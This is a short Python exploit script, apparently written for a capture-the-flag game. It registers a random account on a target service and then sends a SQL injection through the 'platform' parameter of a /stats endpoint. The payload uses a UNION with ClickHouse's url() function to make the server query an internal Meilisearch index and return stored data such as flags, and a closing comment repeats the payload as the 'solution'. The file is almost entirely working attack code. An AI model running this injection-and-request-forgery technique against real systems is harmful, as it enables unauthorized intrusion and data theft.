import requests
import secrets
import sys

IP = sys.argv[1]

# r = requests.post('http://localhost:5005/document', cookies={'PHPSESSID': '5ks980ohcdku6d5u0c312qnue7'}, data={'title': 'kek', 'text': 'flag{abcd}'})
# print(r.status_code)
# print(r.text)
s = requests.Session()

log, password = secrets.token_hex(12), secrets.token_hex(12)
r = s.post(f'http://{IP}:3355/register', data={'username': log, 'password': password})
print(r.text)

inj = '''web' GROUP BY query UNION ALL SELECT 100 as cnt, query FROM url('http://melisearch:7700/indexes/index_1/search?q=*', 'JSONAsString', 'query String') WHERE '1'='1'''

r = s.get(f'http://{IP}:3355/stats?platform=mac&platform=' + inj)


#r = s.get(f'http://{IP}:3355/stats?platform=mac&platform=web%27%20GROUP%20by%20query%20UNION%20ALL%20SELECT%20100%20as%20cnt,query%20FROM%20url("http://melisearch:7700/indexes/index_1/search?q=",%20"JSONAsString",%20%27query%20String%27)%20WHERE%20%271%27=%271')

print(r.text)

'''
solution

web' GROUP by query UNION ALL SELECT 100 as cnt,query FROM url("http://melisearch:7700/indexes/index_0/search?q=", "JSONAsString", 'query String') WHERE '1'='1
'''
